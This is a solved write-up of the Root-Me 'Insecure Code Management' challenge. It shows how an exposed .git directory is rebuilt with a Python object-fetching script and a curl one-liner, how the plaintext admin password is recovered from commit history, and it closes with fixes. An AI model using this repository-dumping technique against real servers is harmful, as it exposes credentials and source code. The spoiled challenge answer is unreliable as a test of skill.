# Root-Me — Web-Server: Insecure Code Management (ch61) — SOLVED

**Target:** http://challenge01.root-me.org/web-serveur/ch61/
**Challenge:** "HR Database" login (20 pts, author Swissky)
**Goal:** Get the password (in clear text) from the admin account.

## Answer

```
username: admin
password: s3cureP@ssw0rd
```

Verified live: `POST admin / s3cureP@ssw0rd` → `Welcome  admin`; a wrong password returns
`Unknown user or password`.

## Vulnerability

The `.git` directory is served by the web server. Anyone can reconstruct the repository
and read **the entire commit history** — including revisions that were deliberately
overwritten later. The current `config.php` only stores a SHA-256 hash, but an earlier
commit still contains the plaintext password. "We changed the password" is not
remediation when the old blob is still retrievable.

This is CWE-527 / CWE-538 — exposure of a version-control repository and of secrets in
history.

## Step by step

### 1. Spot the leak
The app root serves dotfiles that should never be public:

```
200  .git/HEAD
200  .git/config
200  .git/index
200  .git/logs/HEAD
```

`.git/logs/HEAD` (the reflog) is the jackpot — it lists every commit with its message:

```
0000000000000000000000000000000000000000 5e0e146e... John <john@bs-corp.com> ... commit (initial): Initial commit for the new HR database access
5e0e146e... 1572c85d... John <john@bs-corp.com> ... commit: secure auth with md5
1572c85d... a8673b29... John <john@bs-corp.com> ... commit: changed password
a8673b29... 550880c4... John <john@bs-corp.com> ... commit: renamed app name
550880c4... c0b4661c... John <john@bs-corp.com> ... commit: blue team want sha256!!!!!!!!!
```

"changed password" followed by "blue team want sha256" tells you exactly where to look:
the plaintext is in the *previous* revision.

### 2. Reconstruct the repository
Objects are loose (`/objects/info/packs` → 404, and
`/objects/5e/0e146e...` → 200), so no pack parsing is needed. A ~90-line Python script
walks the commit graph and writes a working-tree snapshot per commit:

```python
raw = zlib.decompress(fetch(".git/objects/%s/%s" % (sha[:2], sha[2:])))
nul = raw.index(b"\x00")
typ, _ = raw[:nul].decode().split(" ", 1)      # blob | tree | commit
body = raw[nul + 1:]
```

(script kept at `.workbuddy-ai/tmp/dump_git.py`, dump at `.workbuddy-ai/tmp/repo/`)

```
1_initial     config.php    50 bytes
2_md5         config.php    50 bytes
3_changed_pw  config.php    59 bytes
4_renamed     config.php    59 bytes
5_sha256      config.php   109 bytes
```

### 3. Read `config.php` across history

| Commit | `config.php` |
|---|---|
| `5e0e146` initial | `$password = "admin";` |
| `1572c85` md5 | `$password = "admin";` |
| **`a8673b2` changed password** | **`$password = "s3cureP@ssw0rd";`** |
| `550880c` renamed | `$password = "s3cureP@ssw0rd";` |
| `c0b4661` sha256 | `$password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";` |

### 4. Prove the plaintext is current
The HEAD commit only stores a hash, so confirm the recovered plaintext is the live one:

```python
sha256("s3cureP@ssw0rd") = 0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c
config.php (HEAD)        = 0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c
```

Exact match. `index.php` at HEAD confirms the scheme:

```php
if ($_POST['username'] == $username && hash('sha256', $_POST['password']) == $password)
```

### 5. Verify by effect

| Request | Response |
|---|---|
| `POST admin / s3cureP@ssw0rd` | **`Welcome  admin`** |
| `POST admin / wrongpassword` | `Unknown user or password` |

The hash comparison only proves the *string* matches the stored hash; the login proves it
is the credential that actually works against the deployed app.

## One-liner (fetch the historical blob directly)

```bash
curl -s "http://challenge01.root-me.org/web-serveur/ch61/.git/objects/e1/1aad2eb5..." \
  | python -c "import sys,zlib;print(zlib.decompress(sys.stdin.buffer.read()).split(b'\x00',1)[1].decode())"
```

## Root cause & fix

- **Serve `.git` — never.** Block dotfiles/dot-directories at the web-server layer
  (`location ~ /\. { deny all; }`) and make sure the deploy step excludes `.git`.
- **Rotating a secret does not remove it from history.** Deleting a line in a new commit
  leaves the old blob in the object store forever. A leaked secret must be **rotated**,
  and the repo history rewritten (`git filter-repo`) or the repo treated as compromised.
- **Never commit credentials at all** — `config.php` with `$password` should be gitignored
  and injected by the environment.
